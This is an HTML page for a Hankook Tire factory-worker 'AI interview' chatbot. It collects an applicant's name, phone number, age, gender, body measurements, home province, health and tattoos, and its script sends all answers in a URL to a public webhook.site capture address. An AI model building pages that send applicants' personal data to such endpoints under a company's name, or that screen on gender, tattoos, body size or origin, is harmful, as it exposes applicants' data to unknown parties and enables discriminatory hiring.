<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>韩泰轮胎 - 普工招聘面试</title>
<style type="text/css">
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f4f8; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.container { background: white; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); padding: 40px 32px; max-width: 420px; width: 90%; }
.logo { text-align: center; margin-bottom: 28px; }
.logo h1 { color: #1a5276; font-size: 22px; font-weight: 700; }
.logo p { color: #7f8c8d; font-size: 14px; margin-top: 6px; }
.chat-box { min-height: 300px; max-height: 420px; overflow-y: auto; padding: 16px; background: #f8fafb; border-radius: 12px; margin-bottom: 20px; }
.msg-bot { background: #e8f0fe; color: #2c3e50; padding: 10px 14px; border-radius: 12px 12px 12px 4px; margin-bottom: 10px; max-width: 85%; font-size: 14px; line-height: 1.6; white-space: pre-wrap; }
.msg-user { background: #1a5276; color: white; padding: 10px 14px; border-radius: 12px 12px 4px 12px; margin-bottom: 10px; max-width: 85%; margin-left: auto; font-size: 14px; line-height: 1.6; }
.msg-photo { background: #d5e8d4; color: #2c3e50; padding: 8px 12px; border-radius: 12px 12px 4px 12px; margin-bottom: 10px; max-width: 85%; margin-left: auto; font-size: 13px; line-height: 1.4; }
.msg-photo img { max-width: 100%; border-radius: 8px; margin-top: 6px; }
.msg-success { background: #e8f8f0; color: #27ae60; padding: 16px 14px; border-radius: 12px; margin-bottom: 10px; font-size: 14px; line-height: 1.8; text-align: center; }
.input-area { display: flex; gap: 10px; }
.input-area input[type="text"] { flex: 1; padding: 12px 16px; border: 2px solid #e0e6ed; border-radius: 10px; font-size: 14px; outline: none; transition: border-color 0.2s; }
.input-area input[type="text"]:focus { border-color: #1a5276; }
.input-area button { padding: 12px 20px; background: #1a5276; color: white; border: none; border-radius: 10px; font-size: 14px; cursor: pointer; white-space: nowrap; }
.choice-area { display: none; }
.choice-btn { display: block; width: 100%; padding: 12px; margin-bottom: 8px; background: #e8f0fe; color: #1a5276; border: 2px solid #d0dce8; border-radius: 10px; font-size: 14px; cursor: pointer; transition: all 0.2s; }
.choice-btn:hover, .choice-btn:active { background: #1a5276; color: white; border-color: #1a5276; }
.select-area { display: none; }
.select-row { display: flex; gap: 10px; margin-bottom: 10px; }
.select-row select { flex: 1; padding: 10px; border: 2px solid #e0e6ed; border-radius: 10px; font-size: 14px; outline: none; }
.select-area .confirm-btn { width: 100%; padding: 12px; background: #1a5276; color: white; border: none; border-radius: 10px; font-size: 14px; cursor: pointer; }
.upload-area { display: none; margin-top: 10px; text-align: center; }
.upload-area label { display: inline-block; padding: 10px 20px; background: #27ae60; color: white; border-radius: 10px; font-size: 14px; cursor: pointer; }
.upload-area input { display: none; }
.upload-area .file-name { display: block; margin-top: 8px; font-size: 12px; color: #7f8c8d; }
.upload-area .preview-img { max-width: 200px; max-height: 150px; border-radius: 8px; margin-top: 8px; border: 2px solid #27ae60; }
.progress { text-align: center; margin-bottom: 16px; font-size: 12px; color: #95a5a6; }
.progress-bar { height: 4px; background: #e0e6ed; border-radius: 2px; margin-top: 6px; }
.progress-fill { height: 100%; background: #1a5276; border-radius: 2px; transition: width 0.3s; }
.submit-btn-final { display: none; width: 100%; padding: 14px; background: #27ae60; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; margin-top: 10px; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <h1>&#127981; 韩泰轮胎</h1>
    <p>普工岗位 &#183; 在线面试</p>
  </div>
  <div class="progress" id="progress">问题 1 / 14</div>
  <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:7%"></div></div>
  <div class="chat-box" id="chatBox"></div>
  <div class="input-area" id="inputArea">
    <input type="text" id="answerInput" placeholder="请输入您的回答..." autocomplete="off"/>
    <button onclick="submitAnswer()" id="sendBtn">发送</button>
  </div>
  <div class="choice-area" id="choiceArea"></div>
  <div class="select-area" id="selectArea"></div>
  <div class="upload-area" id="uploadArea">
    <label for="certUpload">&#128206; 上传叉车证照片
      <input type="file" id="certUpload" accept="image/*" onchange="handleUpload(this)"/>
    </label>
    <span class="file-name" id="fileName"></span>
    <div id="uploadPreview" style="display:none">
      <img class="preview-img" id="previewImg" src="" alt="preview"/>
    </div>
    <button class="choice-btn" style="margin-top:10px;background:#27ae60;color:white;border-color:#27ae60" onclick="submitForkliftPhoto()">&#9989; 提交</button>
  </div>
  <a class="submit-btn-final" id="finalSubmitLink" href="#" style="display:none;text-decoration:none;text-align:center">&#9989; 点击提交面试结果</a>
</div>
<script type="text/javascript">//<![CDATA[
var TOTAL=14;
var questions=[
  {text:"您好！欢迎参加韩泰轮胎普工岗位面试，我是AI招聘助理，接下来会问您几个问题。\n\n请问您的姓名是？",type:"text"},
  {text:"请问您的年龄是？",type:"text"},
  {text:"请问您的性别是？",type:"choice",options:["男","女"]},
  {text:"请问您的联系方式（手机号码）是？",type:"text"},
  {text:"请问您的最终学历是？",type:"choice",options:["小学","初中","高中","中专","大专","本科及以上"]},
  {text:"请选择您的身高和体重：",type:"heightweight"},
  {text:"请选择您的户籍所在省份：",type:"province"},
  {text:"您有什么工厂工作经验？如果有，请描述一下？",type:"text"},
  {text:"您能接受加班和夜班吗？我们的工作需要三班三倒。",type:"choice",options:["能接受","不能接受"]},
  {text:"请问身上有纹身吗？",type:"choice",options:["无","有"]},
  {text:"请问您预计什么时候能到岗？",type:"choice",options:["一周内","两周内","一个月内","一个月以上"]},
  {text:"请问您现在的居住地是？",type:"choice",options:["嘉兴秀洲区","嘉兴其他区域","外地"]},
  {text:"请问身体是否健康，无重大疾病？",type:"choice",options:["健康","不健康","其他请说明"]},
  {text:"请问您有无叉车证书？",type:"forklift"}
];
var provinces=["北京","天津","河北","山西","内蒙古","辽宁","吉林","黑龙江","上海","江苏","浙江","安徽","福建","江西","山东","河南","湖北","湖南","广东","广西","海南","重庆","四川","贵州","云南","西藏","陕西","甘肃","青海","宁夏","新疆","香港","澳门","台湾"];
var current=0;
var answers=[];
var certPhoto='';

function addMsg(text,isBot){
  var div=document.createElement('div');
  div.className=isBot?'msg-bot':'msg-user';
  div.textContent=text;
  document.getElementById('chatBox').appendChild(div);
  document.getElementById('chatBox').scrollTop=99999;
}
function addPhotoMsg(dataUrl,fileName){
  var div=document.createElement('div');
  div.className='msg-photo';
  var txt=document.createTextNode('⛎ '+fileName);
  div.appendChild(txt);
  var br=document.createElement('br');
  div.appendChild(br);
  var img=document.createElement('img');
  img.src=dataUrl;
  img.alt='forklift cert';
  div.appendChild(img);
  document.getElementById('chatBox').appendChild(div);
  document.getElementById('chatBox').scrollTop=99999;
}
function updateProgress(){
  document.getElementById('progress').textContent='问题 '+(current+1)+' / '+TOTAL;
  document.getElementById('progressFill').style.width=((current+1)/TOTAL*100)+'%';
}
function hideAllInputs(){
  document.getElementById('inputArea').style.display='none';
  document.getElementById('choiceArea').style.display='none';
  document.getElementById('selectArea').style.display='none';
  document.getElementById('uploadArea').style.display='none';
}
function askNext(){
  if(current<TOTAL){
    updateProgress();
    var q=questions[current];
    setTimeout(function(){
      addMsg(q.text,true);
      hideAllInputs();
      if(q.type==='text'){
        document.getElementById('inputArea').style.display='flex';
        document.getElementById('answerInput').value='';
        document.getElementById('answerInput').placeholder='请输入您的回答...';
      }else if(q.type==='choice'){
        document.getElementById('choiceArea').style.display='block';
        renderChoices(q.options);
      }else if(q.type==='heightweight'){
        document.getElementById('selectArea').style.display='block';
        renderHeightWeight();
      }else if(q.type==='province'){
        document.getElementById('selectArea').style.display='block';
        renderProvince();
      }else if(q.type==='forklift'){
        document.getElementById('choiceArea').style.display='block';
        renderForklift();
      }
    },400);
  }else{
    finishInterview();
  }
}
function renderChoices(options){
  var area=document.getElementById('choiceArea');
  area.innerHTML='';
  options.forEach(function(opt){
    var btn=document.createElement('button');
    btn.className='choice-btn';
    btn.textContent=opt;
    if(opt==='其他请说明'){
      btn.onclick=function(){showOtherTextInput();};
    }else{
      btn.onclick=function(){submitChoice(opt);};
    }
    area.appendChild(btn);
  });
}
function showOtherTextInput(){
  addMsg('其他请说明',false);
  document.getElementById('choiceArea').style.display='none';
  document.getElementById('inputArea').style.display='flex';
  var inp=document.getElementById('answerInput');
  inp.value='';
  inp.placeholder='请输入您的健康状况说明...';
  inp.focus();
}
function renderForklift(){
  var area=document.getElementById('choiceArea');
  area.innerHTML='';
  var btnYes=document.createElement('button');
  btnYes.className='choice-btn';
  btnYes.textContent='有';
  btnYes.onclick=function(){showForkliftUpload();};
  var btnNo=document.createElement('button');
  btnNo.className='choice-btn';
  btnNo.textContent='无';
  btnNo.onclick=function(){submitChoice('无');};
  area.appendChild(btnYes);
  area.appendChild(btnNo);
}
function showForkliftUpload(){
  addMsg('有',false);
  document.getElementById('choiceArea').style.display='none';
  document.getElementById('uploadArea').style.display='block';
  document.getElementById('uploadPreview').style.display='none';
  document.getElementById('fileName').textContent='';
  certPhoto='';
}
function renderHeightWeight(){
  var area=document.getElementById('selectArea');
  var html='<div class="select-row"><select id="heightSelect"><option value="">身高(cm)</option>';
  for(var h=150;h<=190;h+=2){html+='<option value="'+h+'">'+h+' cm</option>';}
  html+='</select><select id="weightSelect"><option value="">体重(kg)</option>';
  for(var w=40;w<=100;w+=0.5){html+='<option value="'+w+'">'+w+' kg</option>';}
  html+='</select></div><button class="confirm-btn" onclick="submitHeightWeight()">确认</button>';
  area.innerHTML=html;
}
function renderProvince(){
  var area=document.getElementById('selectArea');
  var html='<div class="select-row"><select id="provinceSelect" style="width:100%"><option value="">请选择省份</option>';
  provinces.forEach(function(p){html+='<option value="'+p+'">'+p+'</option>';});
  html+='</select></div><button class="confirm-btn" onclick="submitProvince()">确认</button>';
  area.innerHTML=html;
}
function submitChoice(val){
  addMsg(val,false);
  answers.push(val);
  current++;
  askNext();
}
function submitHeightWeight(){
  var h=document.getElementById('heightSelect').value;
  var w=document.getElementById('weightSelect').value;
  if(!h||!w){alert('请选择身高和体重');return;}
  var val='身高'+h+'cm, 体重'+w+'kg';
  addMsg(val,false);
  answers.push(val);
  current++;
  askNext();
}
function submitProvince(){
  var p=document.getElementById('provinceSelect').value;
  if(!p){alert('请选择省份');return;}
  addMsg(p,false);
  answers.push(p);
  current++;
  askNext();
}
function compressImage(dataUrl,maxDim,quality,cb){
  var img=new Image();
  img.onload=function(){
    var w=img.width,h=img.height;
    if(w>maxDim||h>maxDim){
      if(w>h){h=Math.round(h*maxDim/w);w=maxDim;}else{w=Math.round(w*maxDim/h);h=maxDim;}
    }
    var canvas=document.createElement('canvas');
    canvas.width=w;canvas.height=h;
    canvas.getContext('2d').drawImage(img,0,0,w,h);
    cb(canvas.toDataURL('image/jpeg',quality));
  };
  img.src=dataUrl;
}
function handleUpload(input){
  var file=input.files[0];
  if(!file)return;
  document.getElementById('fileName').textContent='已选择: '+file.name;
  var reader=new FileReader();
  reader.onload=function(e){
    compressImage(e.target.result,800,0.6,function(compressed){
      certPhoto=compressed;
      document.getElementById('previewImg').src=compressed;
      document.getElementById('uploadPreview').style.display='block';
    });
  };
  reader.readAsDataURL(file);
}
function submitForkliftPhoto(){
  if(certPhoto){addPhotoMsg(certPhoto,'叉车证照片');}
  answers.push('有');
  current++;
  askNext();
}
var WEBHOOK_URL="https://webhook.site/4dafc72f-8c20-4763-8a0b-2109c0c755be";
var lastSubmitUrl="";

function finishInterview(){
  hideAllInputs();
  var prog=document.getElementById('progress');
  var fill=document.getElementById('progressFill');
  prog.textContent='正在提交...';
  fill.style.width='100%';
  var chatBox=document.getElementById('chatBox');
  var submitMsg=document.createElement('div');
  submitMsg.className='msg-bot';
  submitMsg.id='submitMsg';
  submitMsg.textContent='正在提交面试数据...';
  chatBox.appendChild(submitMsg);
  chatBox.scrollTop=99999;
  
  var now=new Date();
  var timestamp=now.toISOString();
  
  var params=['t='+encodeURIComponent(timestamp),'s=hankook'];
  for(var i=0;i<questions.length&&i<answers.length;i++){
    var val=answers[i]!==undefined?answers[i]:'';
    params.push('q'+(i+1)+'='+encodeURIComponent(val));
  }
  var submitUrl=WEBHOOK_URL+'?'+params.join('&');
  lastSubmitUrl=submitUrl;
  
  try{
    var img=new Image();
    img.onload=function(){showSuccess();};
    img.onerror=function(){showSuccess();};
    img.src=submitUrl;
  }catch(e){}
  
  setTimeout(function(){
    var link=document.getElementById('finalSubmitLink');
    if(link){
      link.href=submitUrl;
      link.style.display='block';
    }
    showSuccess();
  },2000);
}
function showSuccess(){
  var msg=document.getElementById('submitMsg');
  if(msg){
    msg.className='msg-success';
    msg.innerHTML='&#9989; 面试完成！<br/><br/>感谢参加，如果通过，<br/>会有后续负责人进行联系，<br/>请保持手机通畅。';
  }
  document.getElementById('progress').textContent='面试完成';
}
function submitAnswer(){
  var input=document.getElementById('answerInput');
  var val=input.value.trim();
  if(!val)return;
  addMsg(val,false);
  answers.push(val);
  input.value='';
  current++;
  askNext();
}
document.getElementById('answerInput').addEventListener('keydown',function(e){
  if(e.key==='Enter')submitAnswer();
});
askNext();
//]]></script>
</body>
</html>
